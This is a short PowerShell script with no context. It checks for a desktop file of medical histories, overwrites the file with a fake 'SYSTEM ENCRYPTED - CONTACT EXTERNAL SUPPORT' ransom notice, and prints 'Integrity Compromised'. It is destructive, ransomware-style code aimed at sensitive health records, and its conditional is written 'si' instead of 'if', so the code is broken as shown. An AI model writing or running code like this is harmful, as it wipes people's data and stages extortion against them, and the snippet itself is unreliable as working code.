$path = "$home\\Desktop\\CRITICAL_DATA\\Medical_Histories.txt"
si (Test-Path $path) {
"SYSTEM ENCRYPTED - CONTACT EXTERNAL SUPPORT" | Out-File $path
Write-Host "Integrity Compromised" -ForegroundColor Red
}